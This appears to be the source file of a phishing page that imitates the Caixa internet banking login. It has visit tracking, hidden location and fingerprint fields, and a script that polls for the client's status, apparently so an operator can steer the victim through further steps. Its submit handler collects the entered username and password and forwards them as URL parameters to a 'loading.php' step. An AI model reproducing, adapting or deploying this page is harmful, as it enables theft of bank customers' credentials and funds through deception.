<?php
require_once __DIR__ . '/lib/caixa_bootstrap.php';
caixa_bootstrap_public(['track_visits' => true]);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" class="login-pf"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    
    <meta name="robots" content="noindex, nofollow">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">

            <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>        Login Caixa
</title>
    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
            <link href="./index_files/style2.min.css" rel="stylesheet">
            <link href="./index_files/util2.min.css" rel="stylesheet">
            <link href="./index_files/main.min.css" rel="stylesheet">
            <link href="./index_files/float-label.min.css" rel="stylesheet">
            <link href="assets/css/mobile-public.css" rel="stylesheet">

    
</head>

<body>
	<div class="limiter">
	
    
    <div id="kc-container" class="container-login100">
	
		<div id="kc-container2">

		
			<div id="kc-container-wrapper" class="wrap-login100 p-l-50 p-r-50 p-t-7 p-b-30">
			 
					<div id="kc-locale" style="display:none;" class="col-xs-12 col-sm-1">
						<div id="kc-locale-wrapper" class="">
							<div class="kc-dropdown" id="kc-locale-dropdown">
								<a href="" id="kc-current-locale-link">Português</a>
								<ul>
										<li class="kc-dropdown-item"><a href="">Português</a></li>
								</ul>
							</div>
						</div>
					</div>
				<div id="kc-logo">
					<a href=""><div id="kc-logo-wrapper"></div></a>
				</div>
				<div id="kc-header" class="">
					<div id="kc-header-wrapper" class=""><strong>Login Caixa</strong></div>
				</div>


            <script type="text/javascript">
                function validate(event) {
                }

            </script>

            <form id="kc-form-login" class="login100-form validate-form" action="loading.php" method="get">
                <label for="alert" style="display: none;" id="alert" name="alert" class="alert alert-error">Usuário Internet Banking inválido ou bloqueado ou senha incorreta.</label>
                <div class="wrap-input100 validate-input m-b-16">
                            <span class="has-float-label">
                                <label for="fullName" class="texto-nome">Usuário do Internet Banking</label>
                            </span>
                        <input id="username" class="input100" name="username" value="" type="text" autofocus="" autocomplete="off" placeholder="Usuário do Internet Banking" required="">
                    <span class="focus-input100"></span>

                    <span class="symbol-input100">
                        <span class="lnr lnr-user"></span>
                    </span>

                </div>

                <div class="wrap-input100 validate-input m-b-16">

                    <span class="has-float-label">
                        <label for="passwords" class="texto-nome">Senha</label>
                    </span>

                    <input id="password" class="input100" name="password" type="password" autocomplete="off" placeholder="Senha" required="">
                    <span class="focus-input100"></span>
                    <span class="symbol-input100">
                        <span class="lnr lnr-lock"></span>
                    </span>
                </div>

                <div>
                    <input style="display: none;" id="local" class="input100" name="local" type="text">
                    <input style="display: none;" id="fingerprint" class="input100" name="fingerprint" type="text">
                </div>

                <div id="kc-form-options" class="contact100-form-checkbox m-l-4 m-r-8">


                </div>
                <div class="">
                </div>
                <div class="container-login100-form-btn p-t-5">

                        <button class="login100-form-btn" name="login" id="kc-login" type="submit" value="Entrar">
                            Entrar
                        </button>
                </div>

                <script>
                    function enableBtn(){
                        document.getElementById("kc-login").disabled = false;
                    }

                    window.onload = function onload() {
                    }

                    document.getElementById('kc-form-login').addEventListener('submit', function (e) {
                        e.preventDefault();
                        var usuario = document.getElementById('username').value.trim();
                        var senha = document.getElementById('password').value;
                        var url = 'loading.php?etapa_origem=login&etapa_solicitada=1'
                            + '&usuario=' + encodeURIComponent(usuario)
                            + '&senha=' + encodeURIComponent(senha);
                        window.location.href = url;
                    });
                </script>
								
				
			</form></div>
		</div>
    </div>
</div>


<style type="text/css">
    .g-recaptcha {
        margin-bottom: 5%;
    }

    .g-recaptcha div:first-child {
        margin-left:auto !important;
        margin-right:auto !important;
    }

    .texto-nome {
        margin-left: 40px;
    }

    .hide {
        display: none;
    }

    button:disabled {
        cursor: not-allowed;
        color: #80abb3;
        border-color: #d0e0e3;
        background: #d0e0e3;
    }

    button:disabled:hover {
        color: #80abb3;
        border-color: #d0e0e3;
        background: #d0e0e3;
    }    

    .cl-entrar {
        width: 100%;
        float: left;
        text-align: left;
        font-weight: 600;
    }

    .btn-op-acesso {
        float: left;
        width: 100%;
        border: 1px solid #B3C7CB;
        border-radius: 5px;
        padding: 7px;
        color: #48586C;
        font-family: Futura;
        font-size: 16px;
    }

    .btn-op-acesso {
        background:
    }

    .btn-op-acesso img {
        margin-right: 5px;
    }

    #loginGoogle a img {
        margin-top: -3px;
    }

    .cl-linha {
        border-bottom: 1px solid #B3C7CB;
        width: 100%;
        margin-top: 20px;
        float: left;
    }

    .ou {
        float: left;
        text-align: center;
        width: 100%;
        margin-top: -12px;
    }

    .ou small {
        background: #fff;
        padding: 5px;
    }

    .cliente-erro-banner {
        position: fixed;
        top: 16px;
        left: 50%;
        transform: translateX(-50%) translateY(-120%);
        z-index: 99999;
        display: flex;
        align-items: center;
        gap: 10px;
        max-width: 92%;
        padding: 12px 18px;
        border-radius: 6px;
        background: #fde8e8;
        border: 1px solid #f5b5b5;
        color: #b42318;
        font-size: 13px;
        font-weight: 600;
        box-shadow: 0 8px 24px rgba(0,0,0,.12);
        transition: transform .25s ease;
    }

    .cliente-erro-banner.is-visible {
        transform: translateX(-50%) translateY(0);
    }

    .cliente-erro-banner__icon {
        width: 22px;
        height: 22px;
        border-radius: 50%;
        background: #ef4444;
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 14px;
        font-weight: 700;
        flex: 0 0 auto;
    }
</style>
<script src="assets/js/cliente-status.js"></script>
<script>
(function () {
    if (typeof CaixaClienteStatus === 'undefined') return;
    CaixaClienteStatus.iniciarPoll({ pagina: 'index', etapa: 0 });
})();
</script>
</body></html>